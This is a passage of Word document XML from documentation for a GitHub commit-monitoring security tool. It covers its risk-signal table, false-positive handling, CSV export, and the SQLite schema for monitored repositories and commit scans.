      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>force_push</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Lightning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>suspicious_message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Yellow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>binary_files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Package</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Orange</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>dependency_tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DNA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>cicd_tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Wrench</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>config_weakening</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Shield</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Orange</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>False Positive Management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Both individual findings and entire commits can be marked as false positives. When a commit is marked as FP, its risk level is recalculated based on the remaining non-FP findings. This allows security teams to refine results without losing data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSV Export</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>All findings can be exported to CSV format for external reporting, compliance audits, or integration with other security tools. The export includes: severity, rule name, file path, line number, matched text, category, commit SHA, author, and timestamp.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Database Schema</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub Monitor uses 7 dedicated SQLite tables to store all monitoring data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_monitored_repos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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>owner</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GitHub org/user</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>repo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Repository name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>full_name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>owner/repo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Repo description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>default_branch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT DEFAULT "main"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Branch to scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>active</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER DEFAULT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Monitoring enabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>last_scanned_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Last scan timestamp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>total_commits_scanned</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER DEFAULT 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Cumulative scan count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>added_by</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>User who added repo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>created_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Row creation time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_commit_scans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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>repo_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER FK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References github_monitored_repos(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>sha</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit SHA hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_name / author_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit author identity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>committer_name / committer_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Committer identity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>commit_message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Full commit message</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>committed_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit timestamp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>files_changed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Number of files</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>additions / deletions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Line counts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>risk_score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Computed risk score (0-10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>risk_level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>critical/high/medium/low/clean</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>signals</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT (JSON)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Array of detected signals</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>files_detail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT (JSON)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per-file stats</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>false_positive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
